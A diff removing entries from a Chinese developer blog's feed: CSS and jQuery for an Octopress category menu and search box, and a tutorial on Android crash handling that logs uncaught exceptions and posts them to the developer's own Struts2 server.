-z-index: 1;
--webkit-border-radius: 0 0 5px 5px;
--moz-border-radius: 0 0 5px 5px;
--ms-border-radius: 0 0 5px 5px;
--o-border-radius: 0 0 5px 5px;
-border-radius: 0 0 5px 5px
-}
-
-#K_select .menu .container ul
-{
-list-style: none
-}
-
-#K_select .menu .container ul ul
-{
-margin-left: 20px
-}
-
-#K_select .menu .container a
-{
-padding: 0 10px
-}
-
-#K_select .search
-{
-position: absolute;
-/*top: 0;
-right: 0*/
-}
-
-#K_select .search .button
-{
-background: #ddd;
-width: 30px;
-height: 30px;
-position: absolute;
-/*top: 1px;
-right: -1px;*/
-margin-top: 1px;
-margin-left: 315px;
--webkit-border-radius: 0 5px 5px 0;
--moz-border-radius: 0 5px 5px 0;
--ms-border-radius: 0 5px 5px 0;
--o-border-radius: 0 5px 5px 0;
-border-radius: 0 5px 5px 0
-}
-
-#K_select .search .button:before
-{
-content: "\f002";
-color: #f2f2f2;
-font: 20px FontAwesome;
-line-height: 30px;
-position: absolute;
-top: 0;
-left: 7px
-}
-
-#K_select .search .button.on
-{
-background: #ccc
-}
-
-#K_select .search .button.on:before
-{
-content: "\f00d"
-}
-
-#K_select .search .container
-{
-padding-left: 190px;
-/*position: absolute;
-right: 51px;*/
-z-index: 1
-}
-
-#K_select .search input[type="text"]
-{
-background: #fff;
-border: 1px solid #ddd;
-border-right: none;
-color: #999;
-font: 13px "HelveticaNeue-Light","Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,sans-serif;
-height: 30px;
-width: 100%;
-padding: 0 10px;
--webkit-border-radius: 5px 0 0 5px;
--moz-border-radius: 5px 0 0 5px;
--ms-border-radius: 5px 0 0 5px;
--o-border-radius: 5px 0 0 5px;
-border-radius: 5px 0 0 5px
-}
-
-#K_select .search input[type="text"]:focus,#K_select .search input[type="text"]:active
-{
-background: #fff;
-
-color: #666;
-outline: none
-}
-
-@media screen and (max-width: 600px)
-{
-#K_select
-{
-   display: none !important;
-}
-}
-
-@media screen and (min-width: 600px)
-{
-#header {
-    height: 30px !important;
-}
-#header h1
-{
-    float: left !important;
-}
-
-#main-nav {
-    float: left !important;
-    margin-left: 30px;
-    margin-top: 0px;
-}
-} 
-</code></pre>
-
-<h3>0x02 设置JS</h3>
-
-<p>文件 <code>/sourece/javascripts/slash.js</code>在function内添加以下代码</p>
-
-<pre><code>var k_select = $('#K_select');
-
-$('html').click(function(){
-    k_select.find('.on').each(function(){
-        $(this).removeClass('on').next().hide();
-    });
-});
-
-k_select.on('click', '.menu .button', function(){
-    if (!$(this).hasClass('on')){
-        var width = $(this).width() + 42;
-        $(this).addClass('on').next().show().css({width: width});
-    } else {
-        $(this).removeClass('on').next().hide();
-    }
-}).on('click', '.search .button', function(){
-    if (!$(this).hasClass('on')){
-        var width = 120;
-        k_select.children('.menu').children().eq(0).removeClass('on').next().hide();
-        $(this).addClass('on').next().show().css({width: width}).children().children().eq(0).focus();
-    } else {
-        $(this).removeClass('on').next().hide().children().children().eq(0).val('');
-    }
-}).click(function(e){
-    e.stopPropagation();
-});
-</code></pre>
-
-<h3>0x03 遍历分类目录</h3>
-
-<p><code>/source/_include/custom/navigation.html</code>ul标签内</p>
-
-<pre><code>    \{\% for category in site.categories \%\}
-&lt;li&gt;&lt;a href="\{\{ root_url \}\}/blog/categories/\{\{ category | first \}\}"&gt;\{\{ category | first \}\}&lt;/a&gt;&lt;/li&gt;
-\{\% endfor \%\}
-</code></pre>
-
-<h3>参考资料</h3>
-
-<p>遍历分类<a href="http://segmentfault.com/a/1190000000406017">http://segmentfault.com/a/1190000000406017</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[ps网上知识积累]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/07/02/ps.markdwon/"/>
-    <updated>2015-07-02T21:28:46+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/07/02/ps.markdwon</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>ps知识积累</h3>
-
-<p>消除背景<a href="http://jingyan.baidu.com/article/17bd8e52f64bc485ab2bb8c1.html">http://jingyan.baidu.com/article/17bd8e52f64bc485ab2bb8c1.html</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Android 捕抓异常发送给服务器]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/06/25/android_exception/"/>
-    <updated>2015-06-25T21:28:46+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/06/25/android_exception</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<p>在任何服务性行业中,用户遇到的问题,我们就要解决
-所以app也要捕抓到用户在使用过程中的bug</p>
-
-<p>他们就是我们的测试人员</p>
-
-<p>本文中讲两部分,一部分是被我们捕抓到的异常,另一部分是我们没有捕抓到的,从而导致app奔溃的异常。</p>
-
-<p>异常最终都写入log.我把log放在可访问的地方,在浏览器输入地址即可查看</p>
-
-<p>效果如:</p>
-
-<pre><code>用户 ID: null it is UncaughtExceptionHandler
-2015-06-25-22:21class: com.tjrac.activity._0.LoginActivity$AndroidUser_Login; method: run; line: 141;  Exception: java.lang.NullPointerException
-2015-06-25-22:21class: java.lang.Thread; method: run; line: 1019;  Exception: java.lang.NullPointerException
-
-
-用户 ID: null it is UncaughtExceptionHandler
-2015-06-25-22:22class: com.tjrac.activity._0.LoginActivity$AndroidUser_Login; method: run; line: 141;  Exception: java.lang.NullPointerException
-2015-06-25-22:22class: java.lang.Thread; method: run; line: 1019;  Exception: java.lang.NullPointerException
-</code></pre>
-
-<h3>0x00 服务器接受异常数据</h3>
-
-<p>无论是我们捕抓或是没捕抓到的异常,服务器接受的方法都一样,写入一个.log文件中.我用的是Struts2框架</p>
-
-<pre><code>public class PrintException implements Action {
-
-@Override
-public String execute() throws Exception {
-    HttpServletRequest request =ServletActionContext.getRequest();
-    request.getContextPath();
-    File file =new File(ServletActionContext.getServletContext().getRealPath("/log")+"/Exception.log");
-    System.out.println(file.getPath());
-    PrintWriter pw =new PrintWriter(new OutputStreamWriter(new FileOutputStream(file,true),"UTF-8"),true);
-    pw.println("用户 ID: "+request.getParameter("cert_id"));
-    pw.println(request.getParameter("exception"));
-    pw.println();
-    pw.close();
-    return null;
-}
-</code></pre>
-
-<h3>0x01 发送被我们捕抓到的异常</h3>
-
-<p>这个就相对简单直接在捕抓异常后面加一个处理语句.题外话,可不可以重写捕抓异常的方法,然后捕抓异常后会自动发送异常给服务器.</p>
-
-<p>在捕抓到异常后调用sendException方法,我这里多给了一个Context,因为要获取到用户的id 然后方便处理异常.</p>
-
-<pre><code>public static void sendException(Context context,Exception exception){
-    List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
-    params.add(new BasicNameValuePair("cert_id", context
-            .getSharedPreferences("user", 0).getString("cert_id", null)));
-    params.add(new BasicNameValuePair("exception",ExceptionToString(exception)));
-    ModelServer modelHttp = new ModelServer();
-    modelHttp.Model_server(params, "PrintException");
-}
-
-/**
- * 将Exception 转为String
- * @param exception
- * @return
- */
-public static String ExceptionToString(Exception exception ){
-    StringWriter sw = new StringWriter();
-    PrintWriter pw =new PrintWriter(sw);
-    pw.println("异常发生时间 : "+getSystemTime_Minute());
-    exception.printStackTrace(pw);
-    pw.close();
-    return sw.toString();
-}
-</code></pre>
-
-<h3>0x02 设置捕抓全局异常</h3>
-
-<p>这里写了一个捕抓的Handler 通常不用大改,一般只改getTraceInfo()方法。</p>
-
-<pre><code>import java.io.File;
-import java.io.FileOutputStream;
-import java.io.PrintWriter;
-import java.io.StringWriter;
-import java.io.Writer;
-import java.lang.Thread.UncaughtExceptionHandler;
-import java.lang.reflect.Field;
-import java.text.DateFormat;
-import java.text.SimpleDateFormat;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Locale;
-import java.util.Map;
-import java.util.Map.Entry;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
-
-import org.apache.http.NameValuePair;
-import org.apache.http.message.BasicNameValuePair;
-
-import android.annotation.SuppressLint;
-import android.content.Context;
-import android.content.pm.PackageInfo;
-import android.content.pm.PackageManager;
-import android.content.pm.PackageManager.NameNotFoundException;
-import android.os.Build;
-import android.os.Environment;
-import android.os.Looper;
-import android.util.Log;
-import android.widget.Toast;
-
-/**
- * UncaughtException处理类,当程序发生Uncaught异常的时候,有该类来接管程序,并记录发送错误报告.
- * 
- * @author user 
- */
-@SuppressLint("SdCardPath")
-public class CrashHandler implements UncaughtExceptionHandler {
-
-public static final String TAG = "TEST";
-
-// CrashHandler 实例
-private static CrashHandler INSTANCE = new CrashHandler();
-
-// 程序的 Context 对象
-private Context mContext;
-
-// 系统默认的 UncaughtException 处理类
-private Thread.UncaughtExceptionHandler mDefaultHandler;
-
-// 用来存储设备信息和异常信息
-private Map&lt;String, String&gt; infos = new HashMap&lt;String, String&gt;();
-
-// 用来显示Toast中的信息
-private static String error = "程序错误，额，不对，我应该说，服务器正在维护中，请稍后再试";
-
-private static final Map&lt;String, String&gt; regexMap = new HashMap&lt;String, String&gt;();
-
-// 用于格式化日期,作为日志文件名的一部分
-private DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss",
-        Locale.CHINA);
-
-/** 保证只有一个 CrashHandler 实例 */
-private CrashHandler() {
-    //
-}
-
-/** 获取 CrashHandler 实例 ,单例模式 */
-public static CrashHandler getInstance() {
-    initMap();
-    return INSTANCE;
-}
-
-/**
- * 初始化
- * 
- * @param context
- */
-public void init(Context context) {
-    mContext = context;
-
-    // 获取系统默认的 UncaughtException 处理器
-    mDefaultHandler = Thread.getDefaultUncaughtExceptionHandler();
-
-    // 设置该 CrashHandler 为程序的默认处理器
-    Thread.setDefaultUncaughtExceptionHandler(this);
-    Log.d("TEST", "Crash:init");
-}
-
-/**
- * 当 UncaughtException 发生时会转入该函数来处理
- */
-@Override
-public void uncaughtException(Thread thread, Throwable ex) {
-    if (!handleException(ex) &amp;&amp; mDefaultHandler != null) {
-        // 如果用户没有处理则让系统默认的异常处理器来处理
-        mDefaultHandler.uncaughtException(thread, ex);
-        Log.d("TEST", "defalut");
-    } else {
-        try {
-            Thread.sleep(3000);
-        } catch (InterruptedException e) {
-            Log.e(TAG, "error : ", e);
-        }
-        // 退出程序
-        android.os.Process.killProcess(android.os.Process.myPid());
-        // mDefaultHandler.uncaughtException(thread, ex);
-        System.exit(1);
-    }
-}
-
-/**
- * 自定义错误处理，收集错误信息，发送错误报告等操作均在此完成
- * 
- * @param ex
- * @return true：如果处理了该异常信息；否则返回 false
- */
-private boolean handleException(Throwable ex) {
-    if (ex == null) {
-        return false;
-    }
-
-    // 收集设备参数信息
-    // collectDeviceInfo(mContext);
-    // 保存日志文件
-    saveCrashInfo2File(ex);
-    // 使用 Toast 来显示异常信息
-    new Thread() {
-        @Override
-        public void run() {
-            Looper.prepare();
-            Toast.makeText(mContext, error, Toast.LENGTH_LONG).show();
-            Looper.loop();
-        }
-    }.start();
-    return true;
-}
-
-/**
- * 收集设备参数信息
- * 
- * @param ctx
- */
-public void collectDeviceInfo(Context ctx) {
-    try {
-        PackageManager pm = ctx.getPackageManager();
-        PackageInfo pi = pm.getPackageInfo(ctx.getPackageName(),
-                PackageManager.GET_ACTIVITIES);
-
-        if (pi != null) {
-            String versionName = pi.versionName == null ? "null"
-                    : pi.versionName;
-            String versionCode = pi.versionCode + "";
-            infos.put("versionName", versionName);
-            infos.put("versionCode", versionCode);
-        }
-    } catch (NameNotFoundException e) {
-        Log.e(TAG, "an error occured when collect package info", e);
-    }
-
-    Field[] fields = Build.class.getDeclaredFields();
-    for (Field field : fields) {
-        try {
-            field.setAccessible(true);
-            infos.put(field.getName(), field.get(null).toString());
-            Log.d(TAG, field.getName() + " : " + field.get(null));
-        } catch (Exception e) {
-            Log.e(TAG, "an error occured when collect crash info", e);
-        }
-    }
-}
-
-/**
- * 保存错误信息到文件中 *
- * 
- * @param ex
- * @return 返回文件名称,便于将文件传送到服务器
- */
-private String saveCrashInfo2File(Throwable ex) {
-    StringBuffer sb = getTraceInfo(ex);
-    Writer writer = new StringWriter();
-    PrintWriter printWriter = new PrintWriter(writer);
-    ex.printStackTrace(printWriter);
-    Throwable cause = ex.getCause();
-    while (cause != null) {
-        cause.printStackTrace(printWriter);
-        cause = cause.getCause();
-    }
-    printWriter.close();
-
-    String result = writer.toString();
-    sb.append(result);
-    try {
-        long timestamp = System.currentTimeMillis();
-        String time = formatter.format(new Date());
-        String fileName = "crash-" + time + "-" + timestamp + ".log";
-
-        if (Environment.getExternalStorageState().equals(
-                Environment.MEDIA_MOUNTED)) {
-            String path = Environment.getExternalStorageDirectory()
-                    + "/crash/";
-            File dir = new File(path);
-            if (!dir.exists()) {
-                dir.mkdirs();
-            }
-            FileOutputStream fos = new FileOutputStream(path + fileName);
-            fos.write(sb.toString().getBytes());
-            fos.close();
-        }
-
-        return fileName;
-    } catch (Exception e) {
-        Log.e(TAG, "an error occured while writing file...", e);
-    }
-
-    return null;
-}
-
-/**
- * 整理异常信息
- * @param e
- * @return
- */
-public static StringBuffer getTraceInfo(Throwable exception) {
-     /*
-    StringBuffer sb = new StringBuffer();
-
-    Throwable ex = e.getCause() == null ? e : e.getCause();
-    StackTraceElement[] stacks = ex.getStackTrace();
-    for (int i = 0; i &lt; stacks.length; i++) {
-        if (i == 0) {
-            setError(ex.toString());
-        }
-        sb.append(Utils.getSystemTime_Minute()).append("class: ").append(stacks[i].getClassName())
-                .append("; method: ").append(stacks[i].getMethodName())
-                .append("; line: ").append(stacks[i].getLineNumber())
-                .append(";  Exception: ").append(ex.toString() + "\n");
-    }
-
-    Log.d(TAG, sb.toString());
-    */
-    List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
-    params.add(new BasicNameValuePair("cert_id", "null it is UncaughtExceptionHandler"));
-    params.add(new BasicNameValuePair("exception",Utils.ThrowableToString(exception)));
-    ModelServer modelHttp = new ModelServer();
-    modelHttp.Model_server(params, "PrintException");
-    return new StringBuffer(Utils.ThrowableToString(exception));
-}
-
-/**
- * 设置错误的提示语
- * @param e
- */
-public static void setError(String e) {
-    Pattern pattern;
-    Matcher matcher;
-    for (Entry&lt;String, String&gt; m : regexMap.entrySet()) {
-        Log.d(TAG, e+"key:" + m.getKey() + "; value:" + m.getValue());
-        pattern = Pattern.compile(m.getKey());
-        matcher = pattern.matcher(e);
-        if(matcher.matches()){
-            error = m.getValue();
-            break;
-        }
-    }
-}
-
-/**
- * 初始化错误的提示语
- */
-private static void initMap() {
-    // Java.lang.NullPointerException
-    // java.lang.ClassNotFoundException
-    // java.lang.ArithmeticException
-    // java.lang.ArrayIndexOutOfBoundsException
-    // java.lang.IllegalArgumentException
-    // java.lang.IllegalAccessException
-    // SecturityException
-    // NumberFormatException
-    // OutOfMemoryError 
-    // StackOverflowError 
-    // RuntimeException 
-    regexMap.put(".*NullPointerException.*", "嘿，无中生有~Boom!");
-    regexMap.put(".*ClassNotFoundException.*", "你确定你能找得到它？");
-    regexMap.put(".*ArithmeticException.*", "我猜你的数学是体育老师教的，对吧？");
-    regexMap.put(".*ArrayIndexOutOfBoundsException.*", "恩，无下限=无节操，请不要跟我搭话");
-    regexMap.put(".*IllegalArgumentException.*", "你的出生就是一场错误。");
-    regexMap.put(".*IllegalAccessException.*", "很遗憾，你的信用卡账号被冻结了，无权支付");
-    regexMap.put(".*SecturityException.*", "死神马上降临");
-    regexMap.put(".*NumberFormatException.*", "想要改变一下自己形象？去泰国吧，包你满意");
-    regexMap.put(".*OutOfMemoryError.*", "或许你该减减肥了");
-    regexMap.put(".*StackOverflowError.*", "啊，啊，憋不住了！");
-    regexMap.put(".*RuntimeException.*", "你的人生走错了方向，重来吧");
-
-}
-
-}
-</code></pre>
-
-<p>再写一个启动这个Handler的全局类</p>
-
-<pre><code>import android.app.Application;
-
-public class CrashApplication extends Application {
-
-@Override
-public void onCreate() {
-    super.onCreate();
-    CrashHandler crashHandler = CrashHandler.getInstance();
-    crashHandler.init(getApplicationContext());
-}
-
-}
-</code></pre>
-
-<p>然后在AndroidManifest.xml注册下这个全局类</p>
-
-<pre><code> &lt;application
- android:name="com.tjrac.utils.CrashApplication"...&gt;
-</code></pre>
-
-<h3>参考资料</h3>
-
-<p>捕抓全局异常<a href="http://www.cnblogs.com/cpacm/p/3948991.html">http://www.cnblogs.com/cpacm/p/3948991.html</a></p>
 ]]></content>
   </entry>
   
